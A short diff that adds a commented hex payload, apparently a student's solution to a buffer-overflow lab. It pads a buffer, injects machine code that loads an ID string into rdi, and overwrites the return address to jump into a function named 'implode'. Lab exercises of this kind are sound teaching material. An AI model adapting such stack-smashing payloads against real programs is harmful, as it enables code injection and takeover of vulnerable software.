@@ -1,0 +1,7 @@
+01 02 03 04 05 06 07 08 /* 16 padding bytes */
+09 10 11 12 13 14 15 16
+48 c7 c7 d7 89 64 55 c3 /* assembly instructions, move string to rdi */
+b8 89 64 55 /* address of rsp, where the injected code begins */
+00 00 00 00 d4 1c 40 00 00 00 00 /* address of implode function */
+00 00 00 00 00 00 00 00 /* 8 padding bytes, ensures address isn't overwritten */
+34 62 63 61 38 65 34 38 00 /* (00) id code translated through ASCII to hex */
